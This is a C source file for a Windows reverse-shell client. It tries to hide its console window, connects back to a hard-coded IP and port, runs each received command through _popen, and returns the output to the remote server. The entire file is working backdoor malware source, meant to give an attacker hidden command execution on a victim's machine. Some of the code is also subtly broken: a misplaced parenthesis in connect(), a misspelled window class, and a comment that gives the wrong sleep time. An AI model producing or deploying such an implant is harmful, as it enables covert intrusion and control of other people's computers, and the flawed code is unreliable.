/*
    CLIENT
*/

// Needed libraries
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p, size) (void) memset((p),0,(size)) // Making bzero work for windows

int s;

void Shell(){
    char buffer[1024]; // Receive commands from the server
    char container[1024]; 
    char response[18384];

    while (1){
        jump:
        bzero(buffer,sizeof(buffer));
        bzero(container, sizeof(container));
        bzero(response, sizeof(response));
        recv(s, buffer, 1024, 0); // Receive command
        
        if (strncmp("q", buffer, 1) == 0){ // Exit socket connection
            closesocket(s);
            WSACleanup();
            exit(0);
        }else{
            FILE *fp;
            fp = _popen(buffer, "r"); // Open as a process
            while (fgets(container, 1024, fp) != NULL){
                strcat(response, container);
            }
            send(s, response, sizeof(response), 0);
            fclose(fp);
        }

    }

}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){ // Main function with API Entry-Point (access to main functions)  /* Command line args*/      /* Windows form flag*/

    // Make the script invisible

    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowsClass", NULL); // ->

    ShowWindow(stealth, 0); // 0 = Hide window (nCmdShow)

    // End of the function

    // Socket object for connection

    struct sockaddr_in saddr; // Socket vars
    unsigned short port; // Server Port
    char *IP; // Server IP
    WSADATA wsaData; // Structure that contains info about windows sockets

    IP = "192.168.4.26"; // Change IP for connection
    port = 8080; // Change Port for connection
    
    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0){ // Starts winsock.dll by a process
        exit(1);
    }

    // Socket object

    s = socket(AF_INET, SOCK_STREAM, 0);

    memset(&saddr, 0, sizeof(saddr)); // Memory clear
    saddr.sin_family = AF_INET; // IPv4
    saddr.sin_addr.s_addr = inet_addr(IP); // IP var
    saddr.sin_port = htons(port); // Port var ("htons" -> converts to bytes)

    // Try connection

    start:
    while (connect(s, (struct sockaddr *)&saddr, sizeof(saddr) != 0)){ // Loop for checking connection
            Sleep(5); // Will sleep 5 seconds
            goto start; // Restart function
    }
    Shell(); // Recieve commands and send output

} 